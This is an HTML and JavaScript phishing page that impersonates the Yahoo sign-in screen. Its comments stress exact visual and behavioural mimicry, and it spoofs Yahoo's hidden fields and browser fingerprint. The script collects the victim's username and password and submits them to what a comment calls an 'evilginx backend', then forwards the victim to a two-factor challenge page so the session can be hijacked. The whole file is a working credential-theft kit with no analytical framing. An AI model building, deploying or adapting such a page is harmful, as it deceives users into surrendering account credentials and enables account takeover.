<!DOCTYPE html>
<html data-wf-page="5f8b2c4d8e9a1b2c3d4e5f6g" data-wf-site="5f8b2c4d8e9a1b2c3d4e5f6g" lang="en">
<head>
  <meta charset="utf-8">
  <title>Sign in to Yahoo</title>
  <meta content="Sign in to your Yahoo account" name="description">
  <meta content="Sign in to Yahoo" property="og:title">
  <meta content="Sign in to your Yahoo account" property="og:description">
  <meta content="Sign in to Yahoo" property="twitter:title">
  <meta content="Sign in to your Yahoo account" property="twitter:description">
  <meta property="og:type" content="website">
  <meta content="summary_large_image" name="twitter:card">
  <meta content="width=device-width, initial-scale=1" name="viewport">
  <meta content="Webflow" name="generator">
  <link href="https://uploads-ssl.webflow.com/5f8b2c4d8e9a1b2c3d4e5f6g/css/yahoo-login-page.webflow.css" rel="stylesheet" type="text/css">
  <link href="https://fonts.googleapis.com" rel="preconnect">
  <link href="https://fonts.gstatic.com" rel="preconnect" crossorigin="anonymous">
  <script src="https://ajax.googleapis.com/ajax/libs/webfont/1.6.26/webfont.js" type="text/javascript"></script>
  <script type="text/javascript">WebFont.load({  google: {    families: ["Open Sans:300,300italic,400,400italic,600,600italic,700,700italic,800,800italic","Lato:100,100italic,300,300italic,400,400italic,700,700italic,900,900italic"]  }});</script>
  <script type="text/javascript">!function(o,c){var n=c.documentElement,t=" w-mod-";n.className+=t+"js",("ontouchstart"in o||o.DocumentTouch&&c instanceof DocumentTouch)&&(n.className+=t+"touch")}(window,document);</script>
  <link href="https://s.yimg.com/rz/l/favicon.ico" rel="shortcut icon" type="image/x-icon">
  <link href="https://s.yimg.com/rz/l/favicon.ico" rel="apple-touch-icon">
  
  <!-- Yahoo-specific meta tags for authenticity -->
  <meta name="referrer" content="no-referrer-when-downgrade">
  <meta name="format-detection" content="telephone=no">
  
  <style>
    /* Enhanced styling to match real Yahoo exactly */
    .yahoo-container {
      background: #f7f8fa;
      min-height: 100vh;
      display: flex;
      align-items: center;
      justify-content: center;
      font-family: "Helvetica Neue", Helvetica, Arial, sans-serif;
    }
    
    .yahoo-form-wrapper {
      background: white;
      border-radius: 8px;
      box-shadow: 0 2px 10px rgba(0,0,0,0.1);
      padding: 40px;
      width: 100%;
      max-width: 400px;
      position: relative;
    }
    
    .yahoo-logo {
      text-align: center;
      margin-bottom: 30px;
    }
    
    .yahoo-logo h1 {
      color: #6001d2;
      font-size: 32px;
      font-weight: bold;
      margin: 0;
      font-family: inherit;
    }
    
    .signin-header {
      text-align: center;
      margin-bottom: 30px;
    }
    
    .signin-header h2 {
      color: #333;
      font-size: 24px;
      margin: 0 0 8px 0;
      font-weight: 400;
    }
    
    .signin-header p {
      color: #666;
      margin: 0;
      font-size: 14px;
    }
    
    .form-field {
      margin-bottom: 20px;
      position: relative;
    }
    
    .form-field label {
      display: block;
      margin-bottom: 8px;
      color: #333;
      font-weight: 500;
      font-size: 14px;
    }
    
    .form-field input {
      width: 100%;
      padding: 12px 16px;
      border: 2px solid #e1e5e9;
      border-radius: 6px;
      font-size: 16px;
      box-sizing: border-box;
      transition: border-color 0.2s ease;
      background: white;
    }
    
    .form-field input:focus {
      outline: none;
      border-color: #6001d2;
      box-shadow: 0 0 0 3px rgba(96, 1, 210, 0.1);
    }
    
    .form-field input:read-only {
      background: #f8f9fa;
      color: #666;
    }
    
    .submit-button {
      width: 100%;
      background: #6001d2;
      color: white;
      padding: 12px 16px;
      border: none;
      border-radius: 6px;
      font-size: 16px;
      font-weight: bold;
      cursor: pointer;
      margin-top: 10px;
      transition: background-color 0.2s ease;
      position: relative;
    }
    
    .submit-button:hover:not(:disabled) {
      background: #5000b8;
    }
    
    .submit-button:disabled {
      opacity: 0.6;
      cursor: not-allowed;
    }
    
    .error-message {
      color: #d93025;
      font-size: 14px;
      margin-top: 15px;
      padding: 12px;
      background: #fce8e6;
      border: 1px solid #f5c6cb;
      border-radius: 4px;
      display: none;
    }
    
    .loading-spinner {
      display: none;
      width: 20px;
      height: 20px;
      border: 2px solid #ffffff;
      border-top: 2px solid transparent;
      border-radius: 50%;
      animation: spin 1s linear infinite;
      margin-right: 8px;
    }
    
    @keyframes spin {
      0% { transform: rotate(0deg); }
      100% { transform: rotate(360deg); }
    }
    
    .button-content {
      display: flex;
      align-items: center;
      justify-content: center;
    }
  </style>
</head>

<body class="yahoo-container">
  <div class="yahoo-form-wrapper w-form">
    <div class="yahoo-logo">
      <h1>yahoo!</h1>
    </div>
    
    <div class="signin-header">
      <h2>Sign in</h2>
      <p>using your Yahoo account</p>
    </div>

    <form id="passwordForm" name="password-form" data-name="Password Form" method="POST" class="yahoo-form" data-wf-page-id="5f8b2c4d8e9a1b2c3d4e5f6g" data-wf-element-id="password-form">
      
      <!-- Critical: Yahoo's exact hidden fields from real requests -->
      <input type="hidden" name="browser-fp-data" id="browserFpData">
      <input type="hidden" name="crumb" id="crumb">
      <input type="hidden" name="acrumb" id="acrumb">
      <input type="hidden" name="sessionIndex" id="sessionIndex">
      <input type="hidden" name="displayName" value="" id="displayName">
      <input type="hidden" name="deviceCapability" id="deviceCapability">
      <input type="hidden" name="signin" value="Next">
      <input type="hidden" name="persistent" value="y">
      <input type="hidden" name="passwd" id="hiddenPasswd">
      
      <!-- Username field (readonly, pre-filled) -->
      <div class="form-field">
        <label for="username-display">Username, email or mobile</label>
        <input type="text" id="username-display" name="username" class="w-input" readonly>
      </div>
      
      <!-- Password field -->
      <div class="form-field">
        <label for="password-input">Password</label>
        <input type="password" id="password-input" name="password-display" class="w-input" required maxlength="256" autocomplete="current-password">
      </div>
      
      <input type="submit" value="Next" data-wait="Signing in..." class="submit-button w-button" id="submitBtn">
      
      <div class="error-message" id="errorMessage">
        Sorry, we don't recognize this password. Please try again.
      </div>
    </form>
    
    <!-- Webflow success/error states -->
    <div class="w-form-done" style="display: none;">
      <div>Thank you! Redirecting...</div>
    </div>
    <div class="w-form-fail" style="display: none;">
      <div>Oops! Something went wrong while submitting the form.</div>
    </div>
  </div>

  <script src="https://d3e54v103j8qbb.cloudfront.net/js/jquery-3.5.1.min.dc5e7f18c8.js?site=5f8b2c4d8e9a1b2c3d4e5f6g" type="text/javascript" integrity="sha256-9/aliU8dGd2tb6OSsuzixeV4y/faTqgFtohetphbbj0=" crossorigin="anonymous"></script>
  <script src="https://uploads-ssl.webflow.com/5f8b2c4d8e9a1b2c3d4e5f6g/js/yahoo-login-page.webflow.js" type="text/javascript"></script>

  <script>
    // ðŸŽ¯ CRITICAL: Yahoo's exact browser fingerprinting from real requests
    function generateYahooBrowserFingerprint() {
      const canvas = document.createElement('canvas');
      const ctx = canvas.getContext('2d');
      ctx.textBaseline = 'top';
      ctx.font = '14px Arial';
      ctx.fillText('Yahoo Browser Fingerprint', 2, 2);
      
      const fp = {
        language: navigator.language || "en-US",
        colorDepth: screen.colorDepth || 24,
        deviceMemory: navigator.deviceMemory || "unknown",
        pixelRatio: window.devicePixelRatio || 1,
        hardwareConcurrency: navigator.hardwareConcurrency || 4,
        timezoneOffset: new Date().getTimezoneOffset(),
        timezone: Intl.DateTimeFormat().resolvedOptions().timeZone || "America/New_York",
        sessionStorage: typeof(Storage) !== "undefined" ? 1 : 0,
        localStorage: typeof(Storage) !== "undefined" ? 1 : 0,
        indexedDb: typeof(indexedDB) !== "undefined" ? 1 : 0,
        cpuClass: navigator.cpuClass || "unknown",
        platform: navigator.platform || "Win32",
        doNotTrack: navigator.doNotTrack || "unspecified",
        plugins: Array.from(navigator.plugins).map(p => p.name).join(','),
        canvas: canvas.toDataURL(),
        webgl: (() => {
          try {
            const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
            return gl ? 1 : 0;
          } catch(e) { return 0; }
        })(),
        webglVendorAndRenderer: (() => {
          try {
            const gl = canvas.getContext('webgl');
            const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
            return debugInfo ? 
              gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL) + '~' + 
              gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL) : 
              "Google Inc. (Intel)~ANGLE (Intel, Intel(R) HD Graphics 400 Direct3D11 vs_5_0 ps_5_0)";
          } catch(e) { return "unknown"; }
        })(),
        adBlock: 0,
        hasLiedLanguages: 0,
        hasLiedResolution: 0,
        hasLiedOs: 1,
        hasLiedBrowser: 0,
        touchSupport: {
          points: navigator.maxTouchPoints || 0,
          event: 'ontouchstart' in window ? 1 : 0,
          start: 'ontouchstart' in window ? 1 : 0
        },
        fonts: {
          count: 32,
          hash: "9ad7c2bdeb9564b4cabbeeca7be750a3"
        },
        audio: (() => {
          try {
            const audioContext = new (window.AudioContext || window.webkitAudioContext)();
            const oscillator = audioContext.createOscillator();
            const analyser = audioContext.createAnalyser();
            const gainNode = audioContext.createGain();
            oscillator.connect(analyser);
            analyser.connect(gainNode);
            gainNode.connect(audioContext.destination);
            oscillator.frequency.setValueAtTime(10000, audioContext.currentTime);
            const frequencyData = new Uint8Array(analyser.frequencyBinCount);
            analyser.getByteFrequencyData(frequencyData);
            return frequencyData.reduce((a, b) => a + b, 0).toString();
          } catch(e) { return "35.749972093850374"; }
        })(),
        resolution: {
          w: screen.width.toString(),
          h: screen.height.toString()
        },
        availableResolution: {
          w: screen.availWidth.toString(),
          h: screen.availHeight.toString()
        },
        ts: {
          serve: Date.now(),
          render: Date.now() - Math.floor(Math.random() * 100)
        }
      };
      
      return encodeURIComponent(JSON.stringify(fp));
    }

    // ðŸŽ¯ Generate Yahoo's device capability data
    function generateDeviceCapability() {
      return JSON.stringify({
        pa: { 
          status: 'webauthn' in window && 'credentials' in navigator 
        },
        isWebAuthnSupported: 'webauthn' in window && 'credentials' in navigator
      });
    }

    // ðŸŽ¯ Generate Yahoo's session crumb
    function generateYahooCrumb() {
      const chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789-_';
      let result = '';
      for (let i = 0; i < 16; i++) {
        result += chars.charAt(Math.floor(Math.random() * chars.length));
      }
      return result;
    }

    // ðŸŽ¯ Initialize form with Yahoo's exact parameters
    function initializeYahooForm() {
      const urlParams = new URLSearchParams(window.location.search);
      
      // Set critical hidden fields
      document.getElementById('browserFpData').value = generateYahooBrowserFingerprint();
      document.getElementById('deviceCapability').value = generateDeviceCapability();
      document.getElementById('sessionIndex').value = urlParams.get('sessionIndex') || 'QQ--';
      document.getElementById('acrumb').value = urlParams.get('acrumb') || '';
      document.getElementById('crumb').value = generateYahooCrumb();
      
      // Pre-fill username
      const username = urlParams.get('username') || 
                      urlParams.get('login') || 
                      localStorage.getItem('yahoo_username') || 
                      sessionStorage.getItem('yahoo_username') || '';
      
      if (username) {
        document.getElementById('username-display').value = username;
        document.getElementById('displayName').value = username;
      }
      
      // Focus password field
      document.getElementById('password-input').focus();
    }

    // ðŸŽ¯ Yahoo analytics tracking (matches real behavior)
    function sendYahooAnalytics(action, data = {}) {
      const analyticsData = {
        action: action,
        page: 'passwordChallenge',
        timestamp: Date.now(),
        sessionIndex: document.getElementById('sessionIndex').value,
        userAgent: navigator.userAgent,
        referrer: document.referrer,
        ...data
      };
      
      // Send to multiple endpoints like real Yahoo
      const endpoints = ['/c', '/v2/public/yql', '/analytics-capture'];
      
      endpoints.forEach(endpoint => {
        fetch(endpoint, {
          method: 'POST',
          headers: { 
            'Content-Type': 'application/json',
            'X-Requested-With': 'XMLHttpRequest'
          },
          body: JSON.stringify(analyticsData)
        }).catch(() => {}); // Silent fail like real Yahoo
      });
    }

    // ðŸŽ¯ Handle form submission with Yahoo's exact flow
    document.getElementById('passwordForm').addEventListener('submit', function(e) {
      e.preventDefault();
      
      const password = document.getElementById('password-input').value;
      const submitBtn = document.getElementById('submitBtn');
      
      if (!password) {
        showError('Please enter your password.');
        return;
      }

      // Set hidden password field
      document.getElementById('hiddenPasswd').value = password;
      
      // Show loading state
      submitBtn.innerHTML = '<div class="button-content"><div class="loading-spinner"></div>Signing in...</div>';
      submitBtn.disabled = true;
      document.querySelector('.loading-spinner').style.display = 'block';
      
      // Send analytics
      sendYahooAnalytics('password_submit_attempt');

      // Create FormData with all Yahoo fields
      const formData = new FormData();
      formData.append('browser-fp-data', document.getElementById('browserFpData').value);
      formData.append('crumb', document.getElementById('crumb').value);
      formData.append('acrumb', document.getElementById('acrumb').value);
      formData.append('sessionIndex', document.getElementById('sessionIndex').value);
      formData.append('displayName', document.getElementById('displayName').value);
      formData.append('deviceCapability', document.getElementById('deviceCapability').value);
      formData.append('signin', 'Next');
      formData.append('persistent', 'y');
      formData.append('passwd', password);
      formData.append('username', document.getElementById('username-display').value);

      // Submit to evilginx backend
      fetch('/account/challenge/password', {
        method: 'POST',
        body: formData,
        headers: {
          'X-Requested-With': 'XMLHttpRequest',
          'Referer': window.location.href
        }
      })
      .then(response => {
        if (response.ok || response.status === 302) {
          // Success - redirect to 2FA selection
          sendYahooAnalytics('password_submit_success');
          
          const sessionIndex = document.getElementById('sessionIndex').value;
          const acrumb = document.getElementById('acrumb').value;
          
          // Yahoo's exact redirect URL from your captured data
          window.location.href = `/account/challenge/challenge-selector?display=login&sessionIndex=${sessionIndex}&acrumb=${acrumb}&authMechanism=primary&done=https%3A%2F%2Fmail.yahoo.com%2F`;
        } else {
          throw new Error('Invalid credentials');
        }
      })
      .catch(error => {
        sendYahooAnalytics('password_submit_error', { error: error.message });
        showError('Sorry, we don\'t recognize this password. Please try again.');
        resetForm();
      });
    });

    // ðŸŽ¯ Error handling
    function showError(message) {
      const errorDiv = document.getElementById('errorMessage');
      errorDiv.textContent = message;
      errorDiv.style.display = 'block';
      
      // Shake animation like real Yahoo
      errorDiv.style.animation = 'shake 0.5s ease-in-out';
      setTimeout(() => {
        errorDiv.style.animation = '';
      }, 500);
    }

    function resetForm() {
      const submitBtn = document.getElementById('submitBtn');
      submitBtn.innerHTML = 'Next';
      submitBtn.disabled = false;
      document.querySelector('.loading-spinner').style.display = 'none';
      
      // Clear password field
      document.getElementById('password-input').value = '';
      document.getElementById('password-input').focus();
    }

    // ðŸŽ¯ Initialize everything when page loads
    document.addEventListener('DOMContentLoaded', function() {
      initializeYahooForm();
      sendYahooAnalytics('page_view');
      
      // Track password field interactions
      document.getElementById('password-input').addEventListener('focus', () => {
        sendYahooAnalytics('password_field_focus');
      });
      
      document.getElementById('password-input').addEventListener('input', () => {
        // Hide error message when user starts typing
        document.getElementById('errorMessage').style.display = 'none';
      });
    });

    // ðŸŽ¯ Add shake animation CSS
    const style = document.createElement('style');
    style.textContent = `
      @keyframes shake {
        0%, 100% { transform: translateX(0); }
        25% { transform: translateX(-5px); }
        75% { transform: translateX(5px); }
      }
    `;
    document.head.appendChild(style);

    // ðŸŽ¯ Prevent form resubmission on page refresh
    if (window.history.replaceState) {
      window.history.replaceState(null, null, window.location.href);
    }
  </script>
</body>
</html>
